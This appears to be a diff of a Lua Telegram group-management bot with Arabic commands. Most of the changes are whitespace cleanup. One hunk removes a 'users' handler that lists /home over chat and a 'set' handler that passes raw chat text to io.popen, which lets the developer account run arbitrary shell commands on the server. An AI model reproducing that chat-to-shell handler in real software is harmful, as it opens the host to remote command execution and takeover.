@@ -6000,10 +6000,6 @@ send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
 end
 resolve_username(ap[2],delallrtb)
 end
-
-
-
-
 --------------------------------------------------------------------
 if text:match("^حذف كل الرتب (%d+)$") and is_monshi(msg.sender_user_id_, msg.chat_id_) then
 local ap = {string.match(text, "^(حذف كل الرتب) (%d+)$")}
@@ -6050,8 +6046,6 @@ delete_msg(msg.chat_id_, {
 delete_msg(msg.chat_id_, msgs)
 end end
 ------------------------------------------------
------------------------------------------------
-
 if text == 'اللعبه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
 if redis:get(KEEPER.."lock_GEM"..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, "💬┊ اللعبه معطله\n ‏ ", 1, "md")
@@ -6275,22 +6269,6 @@ redis:setex(KEEPER..'Kpch'..msg.sender_user_id_,300,true)
 send(msg.chat_id_, msg.id_, 1, "🌀┊ ارسل لـي معرف قناتك 🍃\n",1, 'html')
 end end
 
---------------------------------------------------
-if text:match('^users$') then
-if not is_KP(msg) then
-send(msg.chat_id_, msg.id_, 1, '💲┊ للمطور الاساسي فقــــــــط', 1, 'md')
-else
-local users = io.popen("cd /home && ls"):read("*all")
-send(msg.chat_id_, msg.id_, 1, '🌀┊ يوزرات الـــروت \n---------------\n'..users..'', 1, 'md')
-end end
-if text:match("^set (.*)$") then
-local txt = {string.match(text, "^(set) (.*)$")}
-if not is_KP(msg) then
-send(msg.chat_id_, msg.id_, 1, '💲┊ للمطور الاساسي فقــــــــط', 1, 'md')
-else
-local pp = ''..txt[2]..''
-io.popen(pp)
-end end
 -----------------ADD Join------------------------------
 if text == 'تفعيل الاشتراك الاجباري' then
 if not is_KP(msg) then
